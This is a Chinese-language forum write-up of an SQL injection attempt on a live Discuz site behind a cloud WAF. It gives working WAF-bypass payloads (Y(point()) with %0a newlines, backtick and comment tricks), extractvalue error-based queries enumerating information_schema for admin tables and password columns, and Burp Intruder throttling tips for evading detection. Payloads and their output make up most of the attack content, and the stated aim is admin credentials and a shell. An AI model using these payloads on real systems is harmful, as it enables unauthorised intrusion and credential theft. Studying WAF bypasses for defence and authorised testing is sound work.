一次失败的SQL注入经历
============

0x00 前言
-------

 某天，聚合扫描器推送了一份SQL注入的漏洞报告，经过测试，漏洞点存在某Cloud WAF，没办法直接利用，故需要绕过证明危害，于是笔者花了一点时间对WAF进行了完整的Bypass(最终还是玩了个寂寞)。整个过程，思路虽然比较基础，但总体还是有趣的，在此，分享出来笔者的过程，并呈现自己的思考。

0x01 WAF识别
----------

1）SQL注入点

目标站点Discuz的微信扫描插件存在SQL注入，直接传入单引号可以引发报错

![图片.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-2497671ebd619a679d2d9478d135886b4b263418.png)

2）尝试进行报错注入，WAF出现拦截，经过Google搜索

尝试payload: `scene_id=1' and extractvalue(0, user())`

![图片.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-ec22f97327f81f432c4cbfaf6b2245849a8c0e0f.png)

根据特征搜索google，发现WhatWaf这个项目有人提交了WAF，属于unkown类型的。

<https://github.com/Ekultek/WhatWaf/issues/856>

<https://github.com/Ekultek/WhatWaf/issues/1568>

看来这个WAF不是很常见，平时经常看到一些各种FUZZ 安全狗和云锁的Bypass的文章，但是实战的时候，我发现安全狗直接拦截`select from`的结构，由于太菜没办法绕过，故对于WAF一直保持自闭，所以遇到这个少众的waf我有点兴奋，心里暗想这波总算遇到好捏的柿子了。

0x02 篇章: Bypassed
-----------------

 正常来说，我们提交漏洞，只需要证明能获取到数据库信息即可，并不需要去获取数据，所以只是为了证明漏洞真实存在的话，难度会低一些，但是如果想尝试获取完整的数据，甚至是通过去查询information\_schema库来获取到完整数据库的结构信息，从而获取到指定的敏感数据的话，就需要进行完整Bypass。

> 这个WAF其实挺聪明的，我尝试构造畸形数据包，比如分块传输和脏数据都没能绕过它，一直以来在我的认知里面，超大的数据对于绕waf来说是挺好用的，因为这是一个性能和安全的不可调和的矛盾。
> 
> 不过在测试的过程，我发现它处理大数据其实是"比较聪明"的,无论多大的数据他都能处理，由于自己才疏学浅，最后只能从语义上面进行bypass了。

### 0x2.1 漏洞证明

**常规尝试**

1.尝试`1' and extractvalue(0, user())%23`发现被拦截， 删掉and， 即`1' extractvalue(0, user())%23`发现可以绕过。

2.尝试`1'^extractvalue(0, user())%23` 成功绕过

![图片.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-3cd52d0352699c5ea6bda51df53dda7343d1005d.png)

3.尝试`1'^extractvalue(0, database())%23` 被拦截，说明了什么呢？ 说明`database()`被重点关照了。

4.因为一般漏洞审核的标准是获取到数据库名，只能尝试继续在database身上下功夫了。

```php
1'^extractvalue(0, database/*%0a*/())%23
1'^extractvalue(0, $Fuzz$database$Fuzz$())%23
```

![图片.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-90712f7a4149ee293f94eaf8b168086ce1060743.png)

Fuzz一圈没有结果，发现`1'^extractvalue(0, database` 这个完全错误的语句都被拦截，只能将database从中间拆分才可以绕过，才能破坏掉WAF的语义。

![图片.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-91f55608497d7a4a95e726e7a81eac557fddd8e6.png)

后面也陆陆续续测了不少思路，比如换行呀，尝试其他连接字符，`/**/`各种注释Fuzz，就不展开说了，下面主要讲讲自己怎么绕过，最终完美地执行`extractvalue(0, database())`语句。

**Fuzz 内置函数**

 在尝试的过程中我发现一个现象,当我传入`1' anxd extractvalue(0, database())%23` 或者删掉`anxd`的时候，waf是放行的，但是如果传入一些常规的操作字符，比如`and`, `&`,`or`,`>`,`<`字符waf则是拦截的，继续尝试官方文档里面的操作符号:  
<https://dev.mysql.com/doc/refman/8.0/en/non-typed-operators.html>，  
最终结果，发现大多数都是不行的，但是Fuzz的过程中，我发现了一个很有趣的，可能导致绕过的点，那就是WAF似乎没办法处理一些不常见的函数，尝试如下:

`1' md5(1) extractvalue(0, database())%23` 拦截

`1' mdx5(1) extractvalue(0, database())%23` 不拦截

`1' and mdx5(1)  and extractvalue(0, database())%23`不拦截

`1' and md5(1)  and extractvalue(0, database())%23` 拦截

`1' and sleep(1)  and extractvalue(0, database())%23` 拦截

`1' and hex(1)  and extractvalue(0, database())%23` 拦截

想到的常规函数都是被拦截，但仅仅依靠自己薄弱的知识面是不全面的，所以我直接从官方文档:  
<https://dev.mysql.com/doc/refman/5.7/en/built-in-function-reference.html>  
里面提取所有内置函数进行FUZZ，写个脚本提取下即可，大概424个内置函数。

```javascript
// https://dev.mysql.com/doc/refman/5.7/en/built-in-function-reference.html
selector = document.querySelectorAll('#docs-body > div > div.table > div:nth-child(3) > table > tbody > tr > th > a > code');
alls = "";
_function = "";
for (index = 0; index < selector.length; index++) {
    _function = selector[index].textContent;
    console.log(_function);
    alls += _function + '\n'
}

var aux = document.createElement("textarea");
aux.value = alls;
document.body.appendChild(aux);
aux.select();document.execCommand("copy");
document.body.removeChild(aux);
console.log("复制成功!");
```

![图片.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-7751f19dc3e340d637340561979ab9bfd7c97118.png)

经过FUZZ，前面比较常规的函数，都被WAF拦截了，另外有一些不常见的函数，都会提示`FUNCTION xxxx.JSON_DEPTH does not exist`，版本的问题，但功夫不负有心人，发现最终我找到一个函数`Y`，是可能导致绕过，且不会报错的，这个函数看起来很有感觉，比较短。

> Y函数:  
> [https://dev.mysql.com/doc/refman/5.7/en/gis-point-property-functions.html#function\_y](https://dev.mysql.com/doc/refman/5.7/en/gis-point-property-functions.html#function_y)
> 
> 虽然官方函数没有给出示例用法，但是给出了ST\_Y()的用法，这个ST\_Y()在目标环境是不存在报错的，但这两个函数的用法是一致的。
> 
> ![图片.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-cbd34c53a31e290037e9acccb7e691d71d9b76a2.png)  
> Usage:
> 
> ```bash
> mysql> SELECT ST_Y(Point(56.7, 53.34));
> +--------------------------+
> | ST_Y(Point(56.7, 53.34)) |
> +--------------------------+
> |                    53.34 |
> +--------------------------+
> ```

尝试payload: `scene_id=1' and  Y(point(56.7, 53.34)) and extractvalue(0,database())%23` ，没有waf拦截，但是没有返回报错。

![图片.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-c812faf67d97cf0a453b02a014d8b22d8de4c6aa.png)

这又是为什么呢? 这里需要注意一个很经典的问题，很多人并不是很了解extractvalue的报错原理:

本质在于第二个参数的类型应该为xpath表达式，否则会出现错误，并抛出整句执行后的错误信息，故构造非法的xpath表达式即可导致报错，从而将数据回显出来。

> ![图片.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-97134326da7cbe01fbd26ad8eb8e829cda79d77b.png)  
> 举个例子:

![图片.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-b170ce2cf32c421c5673f9166c0aef3ed8926f88.png)

第一个参数其实是可以任意的值的，只要不为空，第二个参数我们传入一些不符合xpath表达式的值即可。

```bash
mysql> select extractvalue(0, '1123@123');
ERROR 1105 (HY000): XPATH syntax error: '@123'
```

可以看到，XPATH的回显，只会显示语法开始报错往后的部分，这也是经常容易让人迷糊的地方，需要额外注意。那么我们如何利用这个特性来带出我们想要的值呢，这里我们可以考虑用`concat`拼接非法的表达式，然后后面接我们想要回显的内容。

```php
mysql> select extractvalue(0,concat(0x7e, "123"));
ERROR 1105 (HY000): XPATH syntax error: '~123'
```

通过上面的讲解，了解完报错注入的原理后，回到WAF上面，可以知道之所以没有报错是因为数据库名没有包含特殊字符，那么我们可以通过构造如下的报错语句:

```php
scene_id=1' and  Y(point(56.7, 53.34)) and extractvalue(0,concat(0x7e,database()))%23
```

直接被拦截了，但是通过在`concat`后加上换行即可绕过。

最终绕过的payload如下:

```php
scene_id=1' and  Y(point(56.7, 53.34)) and extractvalue(0,concat%0a(0x7e,database()))%23
```

可能很多小伙伴就在想，是不是%0a起到的作用啊，根本不需要fuzz出Y函数来进行绕过呀，很简单证明这个。

`scene_id=1' %0a and extractvalue(0,concat%0a(0x7e,database()))%23` WAF拦截

`scene_id=1' and %0a extractvalue(0,concat%0a(0x7e,database()))%23` WAF拦截

所以这里Y函数和换行符号的组合是绕过WAF必不可少的的，两者需要搭配起来，再者换行符由于正则匹配，单行匹配的的特性，在绕过waf的时候相当好用。

![图片.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-1fe8b4de487ecb50f0f059eb98e38956029b7010.png)

### 0x2.2 无限制注入

 对于MYSQL来说，特别是8.0以下的版本来说，无限制的注入的定义可以分为两个点:

- 1.常规的WAF绕过目标: 执行select \* from 语句，实现任意表子查询
- 2.实战利用目标，访问到information\_schema数据库，从而完整获取数据库内容

Fuzz 1:

`scene_id=1' and  Y(point(56.7, 53.34)) and extractvalue(0,concat%0a(0x7e,(select from xx)))%23`

通过尝试直接修改插入语句，虽然本来就是语法错误的，但是waf还是直接拦截了，说明应该是`select from xxx`这个格式触发了WAF

继续Fuzz:

`scene_id=1' and  Y(point(56.7, 53.34)) and extractvalue(0,concat%0a(0x7e,(select from xx)))%23` 拦截

`scene_id=1' and  Y(point(56.7, 53.34)) and extractvalue(0,concat%0a(0x7e,(select%0afrom xx)))%23` 拦截

尝试在`select from`中间下功夫，可以绕过waf，这里一定要注意要紧挨着，表名`user`用反引号括起来即可绕过。

```php
1' and  Y(point(56.7, 53.34)) and extractvalue(0,concat%0a(0x7e,(select`user`from%0amysql.user)))%23
```

![图片.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-db28f6939187c2869fdd43425dd3a22b76270dfd.png)

Fuzz 2:

原本我以为绕过第一层Fuzz 1后面会很顺利，但是WAF智能学习得到的特征多的有点出乎意外，竟然对table\_name和select认定为了固定的组合，进行了拦截。

```php
# 只要匹配到select table_name 的格式就会拦截
scene_id=1' and  Y(point(56.7, 53.34)) and extractvalue(0,concat%0a(0x7e,(select`table_name`from xxx)))%23

# 打乱table_name 就不会拦截
scene_id=1' and  Y(point(56.7, 53.34)) and extractvalue(0,concat%0a(0x7e,(select`tab1le_name`from xxx)))%23
```

尝试构造语句打破拦截:

```php
# 尝试插入换行符，拦截
scene_id=1' and  Y(point(56.7, 53.34)) and extractvalue(0,concat%0a(0x7e,(select%0a`table_name`from xxx)))%23
# 尝试通过注释里面加换行符绕过
scene_id=1' and  Y(point(56.7, 53.34)) and extractvalue(0,concat%0a(0x7e,(select/*%0a*/`table_name`from xxx)))%23
```

继续拼接完整的查询语句,waf并没有对后续的语句进行拦截

```php
scene_id=1' and  Y(point(56.7, 53.34)) and extractvalue(0,concat%0a(0x7e,(select/*%0a*/`table_name`from information_schema.tables where table_schema=database() limit 0,1)))%23
```

![图片.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-2f8ac193c8bd89df432be7c18cadcc095703218e.png)

0x03 后续：无疾而终
------------

 绕过了WAF，那么后续自然是想通过注入进入到后台，GetShell完事，但是waf在阻碍日站的速度方面没得说，除非是打算批量日站，要不然我个人觉得写sqlmap tamper的效率并不高，而且这个WAF很容易触发一些意料之外的拦截，所以我选择直接通过Burp获取后台的管理员表。

 测试过程遇到一个很阴间情况，通过`information_schema.columns`尝试去获取指定表名的列的时候，没办法获取到，这是为什么？

```php
mysql> select concat("%", null);
+-------------------+
| concat("%", null) |
+-------------------+
| NULL              |
+-------------------+
1 row in set (0.00 sec)

mysql> select concat_ws(0x7e, null,0x7e);
+----------------------------+
| concat_ws(0x7e, null,0x7e) |
+----------------------------+
| ~                          |
+----------------------------+
1 row in set (0.00 sec)
```

其实这个就是concat的问题，当返回结果为null的时候，无论什么时候拼接都是null，所以可以用`concat_ws`进行替代，下面说一下我是如何快速手工找到后台管理员的表和列的。

```php
1' and  Y(point(56.7, 53.34)) and extractvalue%20%20%20%20%20(0,concat_ws%20%20%20%20%20%20%20%20(0x7e, (select%20concat("@",0x7e,%0atable_name,'#',column_name)%20from%20/**/%0a(information_schema.columns)%20where%20table_name%20like%20%27%25admin%25%27%20limit%201,1)))%23
```

![图片.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-c3dcd4774adbe7c646a328b5cb02e17ce3143b95.png)

原理就是通过`like`语句匹配表名和列名进行模糊查询，但这里有个容易踩坑的地方，`%`需要进行额外的URL编码；至于其他内容，其实是基于前面类似思路进行组合来实现绕过waf，比如在测试过程中，我发现`select@from`是可以bypass的，那么我就想了个办法将`@`插入到中间，最终构造出了如上的绕过的语句。

接下来讲下Burp的Intruder技巧，很多新手对爆破的并发问题并不是很care，我个人认为，良好的测试习惯，并发数不能一下子太高，推荐配置如下，每次并发数目在3～5之间，每次间隔在0.3s之间，然后一定的波动，这在一定程度上能起到Bypass WAF的效果。

![图片.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-8e590bce6eb02d9afe18a41c6698e83a643b258a.png)

看了一圈回显的结果，并没有发现想要的目标表，回到站点的`robots.txt`发现是discuz x3的，那应该是在member表，修改下语句。

```php
(1105) XPATH syntax error: '~common_member#password'<div class="sql">
(1105) XPATH syntax error: '~common_member#username'<div class="sql">
```

原本我以为后面就是常规操作了，但是结果却是令我倍感忧伤的。发张图，一起来感受下什么是绝望，数据库竟然给我返回表不存在，`common_member`表也是，尝试在前面加了前缀，还是不行，这个时候我不禁忧伤地点起了一包烟，这TM太坑人了吧，从逻辑来说都讲不过去呀，果然日站不能靠逻辑，如果你说waf拦截了某个表还好说，但是我现在就是查询当前注入点的表都给我提示不存在，这就很过分了呀。

![图片.png](https://shs3.b.qianxin.com/attack_forum/2023/02/attach-ffc5c8f4e8aabbfc7bf1a31ea2d35810ffe60b47.png)

猜测:

- 是不是数据库不对呢? 反手`information_schema.schemata`fuzz下`SCHEMA_NAME`，发现只存在两个数据库一个`dvbxx2`,一个`ecshop`,看来不是这个问题。
- `ecshop`和`mysql`库都是没有权限的，没办法深入，故尝试直接Fuzz SQLMAP的3000条数据表名字典，全都提示"表不存在"，无疾而终，通过搜索度娘，怀疑是数据库出现了某种错误导致的结果，但是程序的逻辑是没有问题，程序能够正常做判断，除非走的是注入的语句的表查询，则是不行的，我怀疑问题出在是数据库优化环节可能有什么骚操作，折腾了好几个小时，由于目标获取shell的意义并不大，最终只能作罢，如果各位师傅有什么好的想法和见地欢迎给我拍砖。

0x04 总结
-------

 本文的重点在于分享绕过WAF的思路，但是绕过WAF最终的目标是提取到目标的登录后台的账号密码，证明危害。正如，某位前辈说过，日站从来不是一帆风顺一把梭哈的，很有可能后面的某个环节直接导致你前功尽弃。同时由于目标的敏感性，测试SQL注入，我都是采取非常保守的措施，一定不能去触碰核心的数据，危害到网站的正常运行逻辑，故有很多操作在实战环境是没办法展开的，故姑且称之为一次失败的SQL注入经历，也希望大家以后遇到WAF的时候不要慌，可以跟它"较量"一下。